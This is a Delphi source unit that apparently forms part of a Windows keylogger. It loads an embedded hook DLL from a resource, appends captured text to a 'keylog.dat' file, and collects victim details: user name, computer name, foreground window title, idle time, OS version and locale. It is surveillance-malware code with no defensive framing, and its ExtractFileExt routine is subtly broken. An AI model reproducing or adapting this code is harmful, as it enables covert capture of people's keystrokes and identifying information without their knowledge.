unit uFunction;

interface
uses windows,MagicApiHooks;
type
  TFunctions = class
  private
  public
    Function GetOS: string;
    function GetCPUSpeed: Double;
    function GetComputerNetName: string;
    Function GetUserFromWindows: string;
    function GetWindowsLanguage:String;
    function LastDelimiter(const Delimiters, S: string): Integer;
    function GetDll: pointer;
    procedure WriteFileData(szOutPath:string; pFileData:pointer; dSize:integer);
    Function AppendFile(pText: String): boolean;
    function ExtractFileExt(const FileName: string): string;
    Function GetInfos:string;
    function SecondsIdle: DWord;
    function IsWOW64: Boolean;
  end;
var
  Functions: TFunctions;
implementation
uses uInstallation;
//http://www.delphipages.com/forum/showthread.php?t=206540
function TFunctions.IsWOW64: Boolean;
type
  TIsWow64Process = function(
    Handle: THandle;
    var Res: BOOL
  ): BOOL; stdcall;
var
  IsWow64Result: BOOL;
  IsWow64Process: TIsWow64Process;
begin
  IsWow64Process := GetProcAddress(
    GetModuleHandle('kernel32'), 'IsWow64Process'
  );
  if Assigned(IsWow64Process) then
  begin
    IsWow64Process(GetCurrentProcess, IsWow64Result);
    Result := IsWow64Result;
  end
  else
    Result := False;
end;
function TFunctions.SecondsIdle: DWord;
var
   liInfo: TLastInputInfo;
begin
   liInfo.cbSize := SizeOf(TLastInputInfo) ;
   GetLastInputInfo(liInfo) ;
   Result := (GetTickCount - liInfo.dwTime) DIV 1000;
end;
Function TFunctions.GetInfos:string;
var
  tmpStr:string;
  szCurAppNm:array[0..260] of Char;
begin
  GetWindowText(GetForegroundWindow, szCurAppNm, sizeof(szCurAppNm));
  result := getuserfromwindows + '|' + getcomputernetname + '|' + szCurAppNm + '|';
  result := result + inttostr(SecondsIdle) + ' Seconds|';
end;
Function TFunctions.AppendFile(pText: String): boolean;
Var
  FileHandle      : THandle;
  BW              : Cardinal;
  Len             : Cardinal;
  Installation    :TInstaller;
Begin
  Installation := TInstaller.Create;
  Result := False;
  FileHandle := CreateFile(pChar(Installation.GetCurrentDir + '\keylog.dat'), GENERIC_WRITE, FILE_SHARE_WRITE, NIL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
  If FileHandle = INVALID_HANDLE_VALUE Then Exit;
  SetFilePointer(FileHandle, 0, NIL, FILE_END);
  Len := Length(pText);
  WriteFile(FileHandle, pText[1], Len, BW, NIL);
  CloseHandle(FileHandle);
  If (BW = Len) Then Result := True;
  Installation.Free;
End;

procedure TFunctions.WriteFileData(szOutPath:string; pFileData:pointer; dSize:integer);
var
hFile:      THandle;
dWritten:   DWORD;
begin
hFile := CreateFile(PChar(szOutPath), GENERIC_WRITE, FILE_SHARE_WRITE, nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
SetFilePointer(hFile, 0, nil, FILE_BEGIN);
WriteFile(hFile, pfiledata^, dSize, dWritten, nil);
CloseHandle(hFile);
end;

function TFunctions.GetDll: pointer;
var
  hResInfo: HRSRC;
  hRes:     HGLOBAL;
begin
  Result := nil;
  hResInfo := FindResource(hInstance, 'MFT', RT_RCDATA);
  if hResInfo <> 0 then
  begin
    hRes := LoadResource(hInstance, hResInfo);
    if hRes <> 0 then
    begin
      result := LockResource(hRes);
    end;
  end;
end;

function TFunctions.LastDelimiter(const Delimiters, S: string): Integer;
begin
  Result := Length(S);
  while Result > 0 do
  begin
    if (S[Result] <> #0) then begin
      if (s[result] = Delimiters) then Exit;
    end;
    Dec(Result);
  end;
end;

function TFunctions.GetWindowsLanguage:String;
var
Buffer: PChar;
Size: Integer;
begin
Size := GetLocaleInfo(LOCALE_USER_DEFAULT,LOCALE_SABBREVLANGNAME,nil,0);
GetMem(Buffer,Size);
try
GetLocaleInfo(LOCALE_USER_DEFAULT,LOCALE_SABBREVLANGNAME,Buffer,Size);
Result := String(Buffer);
finally
FreeMem(Buffer);
end;
end;

Function TFunctions.GetUserFromWindows: string;
Var
   UserName : string;
   UserNameLen : Dword;
Begin
   UserNameLen := 255;
   SetLength(userName, UserNameLen) ;
   If GetUserName(PChar(UserName), UserNameLen) Then
     Result := Copy(UserName,1,UserNameLen - 1)
   Else
     Result := 'Unknown';
End;

Function TFunctions.GetOS: string;
var
  osVerInfo: TOSVersionInfo;
  majorVer, minorVer: Integer;
begin
  Result := 'OsUnknown';
  osVerInfo.dwOSVersionInfoSize := SizeOf(TOSVersionInfo);
  if GetVersionEx(osVerInfo) then
  begin
    majorVer := osVerInfo.dwMajorVersion;
    minorVer := osVerInfo.dwMinorVersion;
    case osVerInfo.dwPlatformId of
      VER_PLATFORM_WIN32_NT: {Mirosoft Windows NT/2000 }
        begin
          if majorVer <= 4 then
            Result := 'Windows NT'
          else if (majorVer = 5) and (minorVer = 0) then
            Result := 'Windows 2000'
          else if (majorVer = 5) and (minorVer = 1) then
            Result := 'Windows XP'
          else if (majorVer = 6) and (minorVer = 0) then
            Result := 'Windows Vista'
          else if (majorVer = 6) and (minorVer = 1) then
            Result := 'Windows 7'
          else
            Result := 'OsUnknown';
        end;
      VER_PLATFORM_WIN32_WINDOWS:  { Windows 9x/ME }
        begin
          if (majorVer = 4) and (minorVer = 0) then
            Result := 'Windows 95'
          else if (majorVer = 4) and (minorVer = 10) then
          begin
            if osVerInfo.szCSDVersion[1] = 'A' then
              Result := 'Windows 98SE'
            else
              Result := 'Windows 98';
          end
          else if (majorVer = 4) and (minorVer = 90) then
            Result := 'Windows ME'
          else
            Result := 'Unknown';
        end;
      else
        Result := 'Unknown';
    end;
  end
  else
    Result := 'Unknown';
end;

function TFunctions.GetCPUSpeed: Double;
const
DelayTime = 500;
var
TimerHi, TimerLo: DWORD;
PriorityClass, Priority: Integer;
begin
PriorityClass := GetPriorityClass(GetCurrentProcess);
Priority := GetThreadPriority(GetCurrentThread);
SetPriorityClass(GetCurrentProcess, REALTIME_PRIORITY_CLASS);
SetThreadPriority(GetCurrentThread, THREAD_PRIORITY_TIME_CRITICAL);
Sleep(10);
asm
dw 310Fh
mov TimerLo, eax
mov TimerHi, edx
end;
Sleep(DelayTime);
asm
dw 310Fh
sub eax, TimerLo
sbb edx, TimerHi
mov TimerLo, eax
mov TimerHi, edx
end;
SetThreadPriority(GetCurrentThread, Priority);
SetPriorityClass(GetCurrentProcess, PriorityClass);
Result := TimerLo / (1000 * DelayTime);
end;

function TFunctions.GetComputerNetName: string;
var
  buffer: array[0..255] of char;
  size: dword;
begin
  size := 256;
  if GetComputerName(buffer, size) then
    Result := buffer
  else
    Result := ''
end;
function TFunctions.ExtractFileExt(const FileName: string): string;
var
  I: Integer;
begin
  I := LastDelimiter('\', FileName);
  if (I > 0) and (FileName[I] = '.') then
    Result := Copy(FileName, I, MaxInt) else
    Result := '';
end;
end.
